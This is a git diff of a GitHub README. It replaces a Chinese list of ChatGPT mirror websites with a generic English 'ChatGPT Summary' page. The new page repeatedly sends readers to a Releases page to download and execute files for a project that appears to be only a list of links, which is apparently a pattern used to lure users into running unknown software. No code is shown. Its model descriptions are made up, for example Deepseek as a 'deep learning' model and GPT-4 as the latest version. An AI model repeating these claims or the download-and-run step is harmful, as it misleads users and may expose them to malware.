@@ -1,66 +1,99 @@
-# ChatGPT 中文版｜国内 ChatGPT 镜像网站免费推荐（支持 GPT-4、4o和o1\o3\deepseek\grok3）【2025/04/26更新】
+# ChatGPT Summary 🌐
 
-> 更新时间：2025/04/26
+![ChatGPT Summary](https://img.shields.io/badge/ChatGPT%20中文版-%E5%85%8D%E8%B4%B9%E6%8E%A8%E8%8D%90-brightgreen)
 
-> 作者：chatgpt-website
+Welcome to the **ChatGPT Summary** repository! This project aims to provide a comprehensive guide to the Chinese version of ChatGPT, including free mirror sites available in China. We support various versions of GPT, including GPT-4, 4o, and other models like o1, o3, deepseek, and grok3. 
 
-## 如何在国内使用 ChatGPT？
-如果您想在国内使用 ChatGPT，我们为您整理了最新的国内可用 ChatGPT 镜像网站资源。
+For the latest updates and releases, visit our [Releases section](https://github.com/EmanuelCortez21/chatgpt-summary/releases).
 
-这些镜像网站无需翻墙，并支持 ChatGPT-4，您可以无限制地使用 GPT-4o、o1 及其中文版功能。
+## Table of Contents
 
-## 为什么选择使用 ChatGPT 镜像网站？
-ChatGPT 镜像网站是专为国内用户开发的中文版平台，提供了一种无需翻墙即可使用 ChatGPT 的便捷方式。其主要优势包括：
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Supported Models](#supported-models)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-- **无需翻墙**：镜像网站在国内服务器上运行，无需 VPN 或代理，用户可以直接使用 ChatGPT。
-- **中文优化**：提供优化的中文界面和语言支持，提升中文对话的流畅性和自然度。
-- **无限制使用**：不受官方版本的限制，用户可以无限制地使用 GPT-4o 和 o1 模型。
-- **支持高级功能**：除了对话功能，还支持 AI 绘画、AI 思维导图、AI 文件、AI PPT 等，特别适合国内用户。
-- **稳定高速**：采用国内服务器，提供快速且稳定的访问体验。
-- **免费试用**：提供免费试用额度，让用户在不花费的情况下体验强大的 AI 功能。
+## Introduction
 
-## 推荐的 ChatGPT 镜像网站
+ChatGPT has revolutionized how we interact with AI. This repository serves as a resource for users looking to access ChatGPT in Chinese. We aim to make it easier for users in China to utilize this powerful AI tool. 
 
-- **松鼠AI** ([https://songshugpt.com](https://songshugpt.com)) 上线快两年，支持 GPT-3.5、GPT-4、GPT-o1、GPT-o3、Deepseek、Grok3，提供 AI 绘画功能，用户可通过简单扫码快速使用。
+## Features
 
-- **狗狗AI** ([https://gptdog.online/](https://gptdog.online/）) 已运营近两年，支持 GPT-4、4o 及 o1，提供 AI 文件、AI PPT、AI 助手、AI 插件功能和思维导图。
+- **Multiple Model Support**: Access various versions of ChatGPT, including GPT-4, 4o, and more.
+- **User-Friendly**: Easy-to-navigate interface for seamless interaction.
+- **Regular Updates**: We keep our resources current with regular updates.
+- **Community Driven**: Contributions and suggestions are always welcome.
 
-- **CAT AI** ([gptcat.net](https://ggptcat.net)) 运营一年多，支持 GPT-4、4o，并支持 AI 绘画功能（包括 Midjourney 和 Dall·E），适合创意工作者。
+## Installation
 
-- **熊猫GPT** ([ai-panda.xyz](https://ai-panda.xyz)) 提供便捷的 ChatGPT-4 镜像，支持 GPT-4、4o，适合快速访问。
+To get started with ChatGPT Summary, you need to download the latest release. Visit our [Releases section](https://github.com/EmanuelCortez21/chatgpt-summary/releases) to find the necessary files. Download and execute them to set up the project.
 
-- **给我AI** ([givemegpt.top](givemegpt.top)) 免费提供 ChatGPT 服务，支持 GPT-4、4o。
+### Prerequisites
 
-## 国内免费使用指南
+Before installation, ensure you have the following:
 
-1. **选择镜像站**：从推荐列表中选择一个站点，如**松鼠AI** ([https://songshugpt.com](https://songshugpt.com))或 **狗狗AI** ([https://gptdog.online/](https://gptdog.online/）) 。
-2. **注册或使用**：无需注册，按照提示用微信扫码即可。
-3. **选择 ChatGPT 版本**：根据需求选择 GPT-4、GPT-3.5 或 GPT-4o、o1 模型。
-4. **输入问题**：在聊天界面输入问题或任务，即可收到智能回答。
+- A stable internet connection.
+- A compatible operating system (Windows, macOS, or Linux).
 
-## 常见问题答疑
+### Steps
 
-- **镜像站是否安全？**  
-  是的，这些站点经过安全检测，但请避免输入个人敏感信息。
+1. Go to the [Releases section](https://github.com/EmanuelCortez21/chatgpt-summary/releases).
+2. Download the latest version.
+3. Extract the files.
+4. Follow the instructions in the README file included in the release.
 
-- **需要翻墙吗？**  
-  不需要，推荐的站点可以直接在国内访问。
+## Usage
 
-- **镜像站是免费的吗？**  
-  部分站点提供免费使用额度，适合日常使用；一些高级功能可能需要付费，具体请参考站点说明。
+After installation, you can start using ChatGPT Summary. The interface is designed to be intuitive. 
 
-- **哪些站点适合新手？**  
-  - **松鼠AI** ([https://songshugpt.com](https://songshugpt.com)：非常适合新手。
-  - **狗狗AI** ([https://gptdog.online/](https://gptdog.online/）) ：功能多样，适合有更高需求的用户。
+### How to Use
 
-## 联系与更新
+1. Launch the application.
+2. Choose the model you want to interact with.
+3. Enter your queries in the input box.
+4. Press "Enter" to receive responses.
 
-- **反馈问题**：请在 GitHub Issues 中提交，我们会及时关注跟进。
-- **推荐新站点**：通过 Pull Request 提交您发现的新镜像站点。
+### Tips
 
-## 🌟 支持我们
+- Experiment with different models to find the one that best suits your needs.
+- Check for updates regularly to access new features and improvements.
 
-如果本项目对您有所帮助，请为我们点亮一颗 Star ⭐！
+## Supported Models
 
-我们也欢迎您将这个项目分享给更多需要使用 ChatGPT 镜像网站的朋友~
+This project supports the following models:
 
+- **ChatGPT-3.5**: A robust version suitable for general inquiries.
+- **ChatGPT-4**: The latest version with enhanced capabilities.
+- **ChatGPT-4o**: An optimized version for faster responses.
+- **ChatGPT-o1**: A variant focused on specific tasks.
+- **ChatGPT-o3**: Another variant designed for different use cases.
+- **Deepseek**: A specialized model for deep learning tasks.
+- **Grok3**: A model tailored for creative writing and brainstorming.
+
+## Contributing
+
+We welcome contributions from the community. If you have ideas, suggestions, or improvements, please feel free to reach out. 
+
+### How to Contribute
+
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push your changes to your fork.
+5. Submit a pull request.
+
+## License
+
+This project is licensed under the MIT License. Feel free to use it in your own projects.
+
+## Contact
+
+For any inquiries or support, please reach out via the Issues section on GitHub. 
+
+Thank you for your interest in ChatGPT Summary! We hope this resource helps you navigate the world of AI more effectively. 
+
+For the latest updates and releases, visit our [Releases section](https://github.com/EmanuelCortez21/chatgpt-summary/releases).
